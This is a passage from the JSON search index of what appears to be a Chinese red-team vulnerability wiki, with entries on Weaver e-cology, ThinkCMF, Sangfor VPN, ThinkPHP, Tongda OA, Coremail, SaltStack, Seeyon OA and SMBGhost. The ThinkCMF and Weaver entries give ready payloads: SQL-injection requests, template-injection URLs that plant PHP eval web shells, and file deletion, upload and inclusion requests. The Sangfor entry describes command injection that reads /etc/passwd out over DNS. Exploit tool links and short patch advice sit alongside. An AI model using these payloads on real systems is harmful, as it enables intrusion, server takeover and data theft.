https://www.weaver.com.cn/cs/securityDownload.asp","title":"\u6cdb\u5faeOA\u7cfb\u7edf\u591a\u7248\u672c\u5b58\u5728\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e"},{"location":"redteam/%E6%BC%8F%E6%B4%9E%E5%BA%93/#e-cology-oasql","text":"\u6f0f\u6d1e\u7b80\u4ecb \u6cdb \u5fae e-cology OA\u7cfb\u7edf\u7684WorkflowCenterTreeData\u63a5\u53e3\u5728\u4f7f\u7528Oracle\u6570\u636e\u5e93\u65f6,\u7531\u4e8e \u5185 \u7f6e SQL \u8bed \u53e5 \u62fc \u63a5 \u4e0d \u4e25 , \u5bfc \u81f4 \u6cdb \u5fae e-cology OA\u7cfb\u7edf\u5b58\u5728SQL\u6ce8\u5165\u6f0f\u6d1e\u3002\u653b\u51fb\u8005\u5229\u7528\u8be5\u6f0f\u6d1e\uff0c\u53ef\u5728\u672a\u6388\u6743\u7684\u60c5\u51b5\u4e0b \uff0c\u8fdc\u7a0b\u53d1\u9001\u7cbe\u5fc3\u6784\u9020\u7684SQL\u8bed\u53e5\uff0c\u4ece\u800c\u83b7\u53d6\u6570\u636e\u5e93\u654f\u611f\u4fe1\u606f\u3002 \u5f71\u54cd\u8303\u56f4 \u6cdb\u5faee-cology<=9.0 \u6f0f\u6d1e\u590d\u73b0 \u6cdb\u5fae\u751f\u6001OA\u7cfb\u7edfSQL\u6ce8\u5165\u6269\u5c55\u590d\u73b0 https://mumuka.gitee.io/passages/%E6%B3%9B%E5%BE%AEe \ufffecology%20OA%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F% E6%B4%9E%E5%A4%8D%E7%8E%B0/ \u6cdb\u5fae e-cology OA \u524d\u53f0SQL\u6ce8\u5165\u6f0f\u6d1e\u590d\u73b0 https://cloud.tencent.com/developer/article/1521764 \u7b80\u6613poc POST /mobile/browser/WorkflowCenterTreeData.jsp?node=wftype_1&sco pe=2333 HTTP/1.1 Host: ip:port User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8 Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflateContent-Type: application/x-www\ufffeform-urlencoded Content-Length: 2236 Connection: close Upgrade-Insecure-Requests: 1 formids=11111111111)))%0a%0dunion select NULL,value from v$parameter order by (((1 \u5229\u7528\u5de5\u5177 AdministratorGithub/e-cology-OA-SQL https://github.com/AdministratorGithub/e-cology-OA-SQL mmioimm/ecology_test https://github.com/mmioimm/ecology_test \u9632\u62a4\u65b9\u6cd5 \u53ca\u65f6\u6253\u8865\u4e01 \u6cdb\u5fae\u5b98\u65b9\u5b89\u5168\u8865\u4e01\uff1a https://www.weaver.com.cn/cs/securityDownloa d.asp Thinkcmf\u76f8\u5173 \u524d\u53f0SQL\u6ce8\u5165: \u4f9d\u8d56\u6761\u4ef6 \u9700\u8981\u666e\u901a\u7528\u6237\u6743\u9650\uff0c\u9ed8\u8ba4\u53ef\u6ce8\u518c payload\uff1a POST /ThinkCMFX/index.php?g=portal&m=article&a=edit_post HTTP/1.1 Host: localhost Connection: close Cookie: PHPSESSID=kcg5v82ms3v13o8pgrhh9saj95 Content-Type: application/x-www-form-urlencoded Content-Length: 79 postid=bind&postid=0 and updatexml(1, concat(0x7e,user(),0x7e),1)--+- \u524d\u53f0\u6a21\u7248\u6ce8\u5165\u6f0f\u6d1e -\u53efgetshell\u56db\u5904 \uff08\u4ec5\u5728windows\u73af\u5883\u4e0b\u8bbe\u7f6e\uff09 \u7b2c\u4e00\u5904 http://website/ThinkCMFX/index.php?g=Comment&m=Widget&a=fetch & templateFile=/../public/index&content=<%3fphp+file_put_contents('m.p hp','<%3fphp+eval( POST[])%3b');?>&prefix= \u7b2c \u4e8c \u5904 http://website/ThinkCMFX/index.php?g=Api&m=Plugin&a=fetch&templ ateFile=/../../../public/index&content=<%3fphp+file_put_contents('m.php','<%3fphp+eval( POST[])%3b');?>&prefix= \u7b2c \u4e8c \u5904 http://website/ThinkCMFX/index.php?g=Api&m=Plugin&a=fetch&templ ateFile=/../../../public/index&content=<%3fphp+file_put_contents('m.php','<%3fphp+eval( POST[])%3b');?>&prefix= \u7b2c \u4e09 \u5904 /index.php?a=fetch&templateFile=public/index&prefix=''&content=<php file_put_contents('test.php','<?php phpinfo(); ?>') \u7b2c\u56db\u5904/index.php?a=fetch&content=<?php+file_put_contents(\"mrxn.php\", base64_decode(\"PD9waHAgZXZhbCgkX1BPU1RbIjAwMCJdKTs/Pg== \")); \u4efb\u610f\u6587\u4ef6\u5220\u9664 -\u53ea\u80fdwindows\u5220\u9664 \u5728\u7528\u6237\u4e0a\u4f20\u5934\u50cf\u5904\u5b58\u5728\u4efb\u610f\u6587\u4ef6\u5220\u9664\u6f0f\u6d1e\uff0c\u53d1\u9001\u5982\u4e0b\u6570\u636e\u5305\u540e\uff0c\u4f1a\u5220\u9664\u7f51 \u7ad9\u6839\u76ee\u5f55\u4e0b\u4e00\u4e2a\u540d\u4e3a test.txt \u7684\u6587\u4ef6\u3002\uff08\u8be5\u6f0f\u6d1e\u4ec5\u80fd\u5728 Windows \u4e0b\u89e6\u53d1\uff09 POST /ThinkCMFX/index.php?g=User&m=Profile&a=do_avatar& HTTP/1.1 Host: localhost Cookie: PHPSESSID=bggit7phrb1dl99pcb2lagbmq0; Connection: close Content-Type: application/x-www-form-urlencoded Content-Length: 27 imgurl=......\\test.txt \u4efb\u610f\u6587\u4ef6\u4e0a\u4f20 \u5728 ThinkCMFX2.2.3 \u6700\u7ec8\u7248\u4e2d\uff0c\u5b58\u5728\u4e00\u5904\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\uff08\u9700\u8981\u666e\u901a\u7528\u6237\u6743\u9650\uff0c\u9ed8\u8ba4\u53ef\u6ce8\u518c\uff09 curl -F \"file=@/tmp/shell.php\" -X \"POST\" -b 'PHPSESSID=qekmttucmue6vv41kpdjghnkd0;' ' http://127.0.0.1/ThinkCMFX/index.php?g=Asset&m=Ueditor&a=upload &action=uploadfile' \u4efb\u610f\u6587\u4ef6\u5305\u542b \uff08\u8bfb\u53d6\u6570\u636e\u5e93\u914d\u7f6e\u7b49\u7b49\uff09 /index.php?a=display&templateFile=README.md","title":"\u6cdb\u5faeE-cology OA\u7cfb\u7edfSQL\u6ce8\u5165\u6f0f\u6d1e"},{"location":"redteam/%E6%BC%8F%E6%B4%9E%E5%BA%93/#vpn","text":"\u6f0f\u6d1e\u7b80\u4ecb \u6df1\u4fe1\u670d VPN \u67d0\u4e2a\u7279\u5b9a\u4ea7\u54c1\u5b58\u5728\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c, 2019 \u653b\u9632\u6f14\u7ec3\u4f7f\u7528\u8fc7 \u5f71\u54cd\u7ec4\u4ef6 \u6df1\u4fe1\u670d VPN \u6f0f\u6d1e\u6307\u7eb9 Set-Cookie: TWFID=welcome to ssl vpn Sinfor Fofa Dork header=\"Set-Cookie: TWFID=\" \u6f0f\u6d1e\u5206\u6790 \u6df1\u4fe1\u670dvpnweb\u767b\u5f55\u9006\u5411\u5b66\u4e60 \u2013 potatso \u2013 \u535a\u5ba2\u56ed https://www.cnblogs.com/potatsoSec/p/12326356.html \u6f0f\u6d1e\u5229\u7528 \uff08\u7b80\u5355\u7684\u547d\u4ee4\u6ce8\u5165\uff09 wget -t %d -T %d --spider %s \u5229\u7528\u6280\u5de7 \u8be5 \u7248 \u672c \u6df1 \u4fe1 \u670d VPN \u5c5e \u4e8e \u76f8 \u5bf9 \u65e9 \u671f \u7684 \u7248 \u672c , \u5927 \u6982 2008 \u5e74 \u5de6 \u53f3 , \u4f46\u76ee\u524d\u8fd8\u6709761\u4e2aip\u5f00\u653e\u5728\u516c\u7f51 \u8be5 \u7248 \u672c \u8f83 \u4f4e , whomai \u4e0d \u5b58 \u5728 , \u53ef \u4ee5 \u4f7f \u7528 uname, \u8fd9\u91cc\u6ca1\u6709\u7a7a\u683c\u53efdns\u4f20\u51fa\u6765 \u53bb\u9664\u7a7a\u683c\u4e5f\u7b80\u5355 cat /etc/passwd | tr \" \\n\" \"+|\" \u9632\u62a4\u65b9\u6cd5 \u53ca\u65f6\u66f4\u65b0\u8865\u4e01\u5347\u7ea7\u5230\u6700\u65b0\u7248 Thinkphp\u76f8\u5173 ThinkPHP3.2.3_\u7f13\u5b58\u51fd\u6570\u8bbe\u8ba1\u7f3a\u9677\u53ef\u5bfc\u81f4Gets hell \u5f71\u54cd\u7248\u672c <= 3.2.3 \u6f0f\u6d1e\u590d\u73b0 https://xz.aliyun.com/t/99 https://xz.aliyun.com/t/99 ThinkPHP3.2.3_\u6700\u65b0\u7248update\u6ce8\u5165\u6f0f\u6d1e \u5f71\u54cd\u7248\u672c <= 3.2.3 \u6f0f\u6d1e\u590d\u73b0 https://www.anquanke.com/post/id/104847 ThinkPHP3.2.X_find_select_delete\u6ce8\u5165 \u5f71\u54cd\u7248\u672c <= 3.2.3 2.\u6f0f\u6d1e\u590d\u73b0 https://xz.aliyun.com/t/2631https://xz.aliyun.com/t/2629 ThinkPHP3.X_order_by\u6ce8\u5165\u6f0f\u6d1e \u5f71\u54cd\u7248\u672c <= 3.2.3 \u6f0f\u6d1e\u590d\u73b0 https://cloud.tencent.com/developer/news/305625 ThinkPHP5_SQL\u6ce8\u5165\u6f0f\u6d1e&&\u654f\u611f\u4fe1\u606f\u6cc4\u9732 \u5f71\u54cd\u7248\u672c < 5.0.9 \u6f0f\u6d1e\u590d\u73b0 https://xz.aliyun.com/t/125 > < https://www.leavesongs.com/PENETRATION/thinkphp5-in \ufffesqlinjection.html ThinkPHP5.0.10- 3.2.3_\u7f13\u5b58\u51fd\u6570\u8bbe\u8ba1\u7f3a\u9677\u53ef\u5bfc\u81f4Getshell \u5f71\u54cd\u7248\u672c < 5.0.11 \u6f0f\u6d1e\u590d\u73b0 https://xz.aliyun.com/t/99 ThinkPHP\u6846\u67b65.0.X_sql\u6ce8\u5165\u6f0f\u6d1e\u5206\u6790 \u5f71\u54cd\u7248\u672c < 5.0.16 \u6f0f\u6d1e\u590d\u73b0 https://xz.aliyun.com/t/2257 ThinkPHP5.X_order_by\u6ce8\u5165\u6f0f\u6d1e \u5f71\u54cd\u7248\u672c <= 5.1.22 \u6f0f\u6d1e\u590d\u73b0 https://www.cnblogs.com/wangtanzhi/p/12741498.html ThinkPHP5.X_\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c \u5f71\u54cd\u7248\u672c 5.0.5-5.0.22 5.1.0-5.1.30 \u6f0f\u6d1e\u590d\u73b0 https://xz.aliyun.com/t/3570https://paper.seebug.org/760https://pap er.seebug.org/770","title":"\u6df1\u4fe1\u670dVPN\u76f8\u5173"},{"location":"redteam/%E6%BC%8F%E6%B4%9E%E5%BA%93/#oa_2","text":"","title":"\u901a\u8fbeOA\u76f8\u5173"},{"location":"redteam/%E6%BC%8F%E6%B4%9E%E5%BA%93/#oa_3","text":"1.\u6f0f\u6d1e\u7b80\u4ecb \u901a\u8fbeOA\u91c7\u7528\u57fa\u4e8eWEB\u7684\u4f01\u4e1a\u8ba1\u7b97\uff0c\u4e3bHTTP\u670d\u52a1\u5668\u91c7\u7528\u4e86\u4e16\u754c\u4e0a\u6700\u5148\u8fdb\u7684 Apache\u670d\u52a1\u5668\uff0c\u6027\u80fd\u7a33\u5b9a\u53ef\u9760\u3002\u6570\u636e\u5b58\u53d6\u96c6\u4e2d\u63a7\u5236\uff0c\u907f\u514d\u4e86\u6570\u636e\u6cc4\u6f0f\u7684\u53ef \u80fd\u3002\u63d0\u4f9b\u6570\u636e\u5907\u4efd\u5de5\u5177\uff0c\u4fdd\u62a4\u7cfb\u7edf\u6570\u636e\u5b89\u5168\u3002\u591a\u7ea7\u7684\u6743\u9650\u63a7\u5236\uff0c\u5b8c\u5584\u7684\u5bc6 \u7801\u9a8c\u8bc1\u4e0e\u767b\u5f55\u9a8c\u8bc1\u673a\u5236\u66f4\u52a0\u5f3a\u4e86\u7cfb\u7edf\u5b89\u5168\u6027\u3002 2.\u5f71\u54cd\u8303\u56f4 \u901a\u8fbeOA2017 \u901a\u8fbeOA V11.x<V11.5 3.\u6f0f\u6d1e\u6307\u7eb9 /static/templates/2017_01/userName.png Office Anywhere 20xx\u7248 \u7f51\u7edc\u667a\u80fd\u529e\u516c\u7cfb\u7edf /ispirit/interface/gateway.php 4.\u6f0f\u6d1e\u5229\u7528\u5de5\u5177 https://github.com/NS-Sp4ce/TongDaOA-Fake-User https://github.com/zrools/tools/blob/master/python/tongda_v11.4_rce_e xp.py 5.\u8be6\u7ec6\u6587\u7ae0 https://www.cnblogs.com/lovequitepcs/p/12864203.html 6.\u5229\u7528\u6280\u5de7\u4e0e\u5751\u70b9 \u53ef\u4ee5\u4f7f\u7528chrome\u7684EditThisCookie\u63d2\u4ef6\u4fee\u6539cookie\uff0c\u4fee\u6539cookies\u522b\u5fd8\u8bb0\u8bbf \u95ee\uff0c\u5426\u5219\u65e0\u6cd5\u767b\u5f55\u6210\u529f /general/index.php?isIB=0&modify_pwd=0 7.\u9632\u62a4\u65b9\u6cd5 \u5347\u7ea7\u901a\u8fbeoa\u5230\u6700\u65b0\u7248\u672c","title":"\u901a\u8fbeOA\u4efb\u610f\u7528\u6237\u767b\u5f55\u6f0f\u6d1e"},{"location":"redteam/%E6%BC%8F%E6%B4%9E%E5%BA%93/#oa_4","text":"1.\u6f0f\u6d1e\u7b80\u4ecb \u901a\u8fbeOA\u91c7\u7528\u57fa\u4e8eWEB\u7684\u4f01\u4e1a\u8ba1\u7b97\uff0c\u4e3bHTTP\u670d\u52a1\u5668\u91c7\u7528\u4e86\u4e16\u754c\u4e0a\u6700\u5148\u8fdb\u7684 Apache\u670d\u52a1\u5668\uff0c\u6027\u80fd\u7a33\u5b9a\u53ef\u9760\u3002\u6570\u636e\u5b58\u53d6\u96c6\u4e2d\u63a7\u5236\uff0c\u907f\u514d\u4e86\u6570\u636e\u6cc4\u6f0f\u7684\u53ef \u80fd\u3002\u63d0\u4f9b\u6570\u636e\u5907\u4efd\u5de5\u5177\uff0c\u4fdd\u62a4\u7cfb\u7edf\u6570\u636e\u5b89\u5168\u3002\u591a\u7ea7\u7684\u6743\u9650\u63a7\u5236\uff0c\u5b8c\u5584\u7684\u5bc6 \u7801\u9a8c\u8bc1\u4e0e\u767b\u5f55\u9a8c\u8bc1\u673a\u5236\u66f4\u52a0\u5f3a\u4e86\u7cfb\u7edf\u5b89\u5168\u6027\u3002 2.\u5f71\u54cd\u8303\u56f4 \u901a\u8fbeOA V11\u7248 \u901a\u8fbeOA 2017\u7248 \u901a\u8fbeOA 2016\u7248 \u901a\u8fbeOA 2015\u7248 \u901a\u8fbeOA 2013\u589e\u5f3a\u7248 \u901a\u8fbeOA 2013\u7248 3.\u6f0f\u6d1e\u5229\u7528\u5de5\u5177 https://github.com/jas502n/OA-tongda-RCE 4.\u8be6\u7ec6\u6587\u7ae0 https://zhuanlan.zhihu.com/p/114264570 5.\u9632\u62a4\u65b9\u6cd5 \u66f4\u65b0\u901a\u8fbeoa\u6700\u65b0\u8865\u4e01 \u5b89\u5168\u66f4\u65b0\u5730\u5740: http://www.tongda2000.com/news/673.php","title":"\u901a\u8fbeOA\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e"},{"location":"redteam/%E6%BC%8F%E6%B4%9E%E5%BA%93/#oa_5","text":"1.\u6f0f\u6d1e\u7b80\u4ecb \u901a\u8fbeOA\u91c7\u7528\u57fa\u4e8eWEB\u7684\u4f01\u4e1a\u8ba1\u7b97\uff0c\u4e3bHTTP\u670d\u52a1\u5668\u91c7\u7528\u4e86\u4e16\u754c\u4e0a\u6700\u5148\u8fdb\u7684 Apache\u670d\u52a1\u5668\uff0c\u6027\u80fd\u7a33\u5b9a\u53ef\u9760\u3002\u6570\u636e\u5b58\u53d6\u96c6\u4e2d\u63a7\u5236\uff0c\u907f\u514d\u4e86\u6570\u636e\u6cc4\u6f0f\u7684\u53ef \u80fd\u3002\u63d0\u4f9b\u6570\u636e\u5907\u4efd\u5de5\u5177\uff0c\u4fdd\u62a4\u7cfb\u7edf\u6570\u636e\u5b89\u5168\u3002\u591a\u7ea7\u7684\u6743\u9650\u63a7\u5236\uff0c\u5b8c\u5584\u7684\u5bc6 \u7801\u9a8c\u8bc1\u4e0e\u767b\u5f55\u9a8c\u8bc1\u673a\u5236\u66f4\u52a0\u5f3a\u4e86\u7cfb\u7edf\u5b89\u5168\u6027\u3002 2.\u5f71\u54cd\u8303\u56f4 \u901a\u8fbeOA v2017\u3001v11.x < v11.5 \u652f\u6301\u626b\u7801\u767b\u5f55\u7248\u672c 3.\u6f0f\u6d1e\u5206\u6790\u6587\u7ae0 https://xz.aliyun.com/t/7704#toc-4","title":"\u901a\u8fbeOA\u626b\u7801\u767b\u5f55\u4efb\u610f\u7528\u6237\u767b\u5f55"},{"location":"redteam/%E6%BC%8F%E6%B4%9E%E5%BA%93/#coremail","text":"\u6f0f\u6d1e\u7b80\u4ecb Coremail\u90ae\u4ef6\u7cfb\u7edf\u914d\u7f6e\u6587\u4ef6\u4fe1\u606f\u6cc4\u9732\u6f0f\u6d1e Coremail\u4ea7\u54c1\u8bde\u751f\u4e8e1999\u5e74\uff0c\u7ecf\u8fc7\u4e8c\u5341\u591a\u5e74\u53d1\u5c55\uff0c\u5982\u4eca\u4ece\u4ebf\u4e07\u7ea7\u522b\u7684 \u8fd0\u8425\u7cfb\u7edf\uff0c\u5230\u51e0\u4e07\u4eba\u7684\u5927\u578b\u4f01\u4e1a\uff0c\u90fd\u6709\u4e86Coremail\u7684\u5ba2\u6237\u3002 \u622a\u6b622019\u5e74\uff0cCoremail\u90ae\u4ef6\u7cfb\u7edf\u4ea7\u54c1\u5728\u56fd\u5185\u5df2\u62e5\u670910\u4ebf\u7ec8\u7aef\u7528\u6237 \uff0c\u662f\u76ee\u524d\u56fd\u5185\u62e5\u6709\u90ae\u7bb1\u4f7f\u7528\u7528\u6237\u6700\u591a\u7684\u90ae\u4ef6\u7cfb\u7edf\u3002Coremail\u4eca\u5929\u4e0d\u4f46 \u4e3a\u7f51\u6613\uff08126\u3001163\u3001yeah\uff09\u3001\u79fb\u52a8\uff0c\u8054\u901a\u7b49\u77e5\u540d\u8fd0\u8425\u5546\u63d0\u4f9b\u7535\u5b50\u90ae\u4ef6 \u6574\u4f53\u6280\u672f\u89e3\u51b3\u65b9\u6848\u53ca\u4f01\u4e1a\u90ae\u5c40\u8fd0\u8425\u670d\u52a1\uff0c\u8fd8\u4e3a\u77f3\u6cb9\u3001\u94a2\u94c1\u3001\u7535\u529b\u3001\u653f\u5e9c \u3001\u91d1\u878d\u3001\u6559\u80b2\u3001\u5c16\u7aef\u5236\u9020\u4f01\u4e1a\u7b49\u7528\u6237\u63d0\u4f9b\u90ae\u4ef6\u7cfb\u7edf\u8f6f\u4ef6\u548c\u53cd\u5783\u573e\u670d\u52a1\u3002 \u5229\u7528\u65b9\u5f0f http://host/mailsms/s?func=ADMIN:appState&dumpConfig=/ \u6d4f\u89c8\u5668\u8bf7\u6c42\u8bbf\u95ee\uff0c\u5373\u53ef\u67e5\u770b\u914d\u7f6e\u6587\u4ef6\u4fe1\u606f\u3002 \u4fee\u590d\u65b9\u6cd5 \u66f4\u65b0Coremail\u7248\u672c\u6216\u8054\u7cfb\u5382\u5bb6\u4fee\u590d","title":"Coremail\u6f0f\u6d1e\u76f8\u5173"},{"location":"redteam/%E6%BC%8F%E6%B4%9E%E5%BA%93/#saltstack","text":"\u6f0f\u6d1e\u7b80\u4ecb SaltStack\u662f\u57fa\u4e8ePython\u5f00\u53d1\u7684\u4e00\u5957C/S\u67b6\u6784\u914d\u7f6e\u7ba1\u7406\u5de5\u5177\uff0c\u662f\u4e00\u4e2a\u670d \u52a1\u5668\u57fa\u7840\u67b6\u6784\u96c6\u4e2d\u5316\u7ba1\u7406\u5e73\u53f0\uff0c\u5177\u5907\u914d\u7f6e\u7ba1\u7406\u3001\u8fdc\u7a0b\u6267\u884c\u3001\u76d1\u63a7\u7b49\u529f\u80fd \u3002 \u5f71\u54cd\u8303\u56f4\uff1a SaltStack < 2019.2.4 SaltStack < 3000.2 \u6f0f\u6d1e\u5229\u7528\u5de5\u5177 Saltstack\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1eEXP https://github.com/Imanfeng/SaltStack-Exp.git \u8be6\u7ec6\u6587\u7ae0 https://www.cnblogs.com/Cl0wn/p/12918432.html \u4fee\u590d\u65b9\u6cd5 \u66f4\u65b0\u7248\u672c SaltStack = 2019.2.4 SaltStack = 3000.2 https://github.com/saltstack/salt/commit/a67d76b15615983d467ed8 1371b38b4a17e4f3b7 https://github.com/saltstack/salt/commit/d5801df94b05158dc8e48c 5e6912b065044720f3","title":"SaltStack\u6f0f\u6d1e\u76f8\u5173"},{"location":"redteam/%E6%BC%8F%E6%B4%9E%E5%BA%93/#oa_6","text":"\u6f0f\u6d1e\u7b80\u4ecb CNVD \u300a \u5173 \u4e8e \u81f4 \u8fdc OA\ufffeA8\u7cfb\u7edf\u5b58\u5728\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\u7684\u5b89\u5168\u516c\u544a\u300b\uff1a https://www.cnvd.org.c n/webinfo/show/5095 \u8be5 \u7cfb \u7edf \u7684 \u6f0f \u6d1e \u70b9 \u5728 \u4e8e \u81f4 \u8fdc OA\ufffeA8\u7cfb\u7edf\u7684Servlet\u63a5\u53e3\u66b4\u9732\uff0c\u5b89\u5168\u8fc7\u6ee4\u5904\u7406\u63aa\u65bd\u4e0d\u8db3\uff0c\u4f7f\u5f97\u7528\u6237\u5728\u65e0\u9700 \u8ba4\u8bc1\u7684\u60c5\u51b5\u4e0b\u5b9e\u73b0\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u3002 \u653b\u51fb\u8005\u5229\u7528\u8be5\u6f0f\u6d1e\uff0c\u53ef\u5728\u672a\u6388\u6743\u7684\u60c5\u51b5\u4e0b\uff0c\u8fdc\u7a0b\u53d1\u9001\u7cbe\u5fc3\u6784\u9020\u7684\u7f51\u7ad9\u540e \u95e8\u6587\u4ef6\uff0c\u4ece\u800c\u83b7\u53d6\u76ee\u6807\u670d\u52a1\u5668\u6743\u9650\uff0c\u5728\u76ee\u6807\u670d\u52a1\u5668\u4e0a\u6267\u884c\u4efb\u610f\u4ee3\u7801\u6f0f\u6d1e \u3002 \u5f71\u54cd\u8303\u56f4 \u81f4\u8fdcOA A8-V5 V6.1 SP1 \u81f4\u8fdcOA A8+\u534f\u540c\u7ba1\u7406\u8f6f\u4ef6 V7.0 \u81f4\u8fdcOA A8+\u534f\u540c\u7ba1\u7406\u8f6f\u4ef6 V7.0 SP1 \u81f4\u8fdcOA A8+\u534f\u540c\u7ba1\u7406\u8f6f\u4ef6 V7.0 SP2 \u81f4\u8fdcOA A8+\u534f\u540c\u7ba1\u7406\u8f6f\u4ef6 V7.0 SP3 \u81f4\u8fdcOA A8+\u534f\u540c\u7ba1\u7406\u8f6f\u4ef6 V7.1 \u6f0f\u6d1e\u5229\u7528\u5de5\u5177 https://github.com/timwhitez/seeyon-OA-A8-GetShell \u8be6\u7ec6\u6587\u7ae0 https://www.jianshu.com/p/0955bdd7329c \u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u8be6\u60c5 https://www.cnblogs.com/AtesetEnginner/p/12106741.html","title":"\u81f4\u8fdcOA\u6f0f\u6d1e\u76f8\u5173"},{"location":"redteam/%E6%BC%8F%E6%B4%9E%E5%BA%93/#_1","text":"","title":"\u5386\u53f2\u6f0f\u6d1e\u76f8\u5173\u4fe1\u606f"},{"location":"redteam/%E6%BC%8F%E6%B4%9E%E5%BA%93/#cve-2020-0796","text":"\u6f0f\u6d1e\u7b80\u4ecb \u5fae\u8f6fSMBv3 Client/Server\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1eCVE-2020-0796 \u5f71\u54cd\u8303\u56f4\uff1a Windows 10 Version 1903 for 32-bit SystemsWindows 10 Version 1903 for x64-based SystemsWindows 10 Version 1903 for ARM64- based SystemsWindows Server, Version 1903 (Server Core installation)Windows 10 Version 1909 for 32-bit SystemsWindows 10 Version 1909 for x64-based SystemsWindows 10 Version 1909 for ARM64-based SystemsWindows Server, Version 1909 (Server Core installation) \u6f0f\u6d1e\u5229\u7528\u5de5\u5177 https://github.com/chompie1337/SMBGhost_RCE_PoC \u8be6\u7ec6\u6587\u7ae0 https://www.cnblogs.com/Iamyoyodan/p/13081273.html \u5229\u7528\u6280\u5de7\u4e0e\u5751\u70b9 \u5076\u5c14\u4f1a\u84dd\u5c4f \u9632\u62a4\u65b9\u6cd5 \u5173\u95ed\u9ad8\u5371\u7aef\u53e3139\u3001445\uff0c\u66f4\u65b0\u7cfb\u7edf\u5b89\u5168\u8865\u4e01\u7981\u7528SMBv3\u538b\u7f29\u547d\u4ee4: Set-ItemProperty -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\ Parameters\" DisableCompression -Type DWORD -Value 1 - Force","title":"CVE-2020-0796 \u6c38\u6052\u4e4b\u9ed1\u6f0f\u6d1e\u76f8\u5173"},{"location":"redteam/%E7%BA%A2%E9%98%9F%E7%9B%AE%E5%BD%95/","text":"11","title":"\u76ee\u5f55"}]}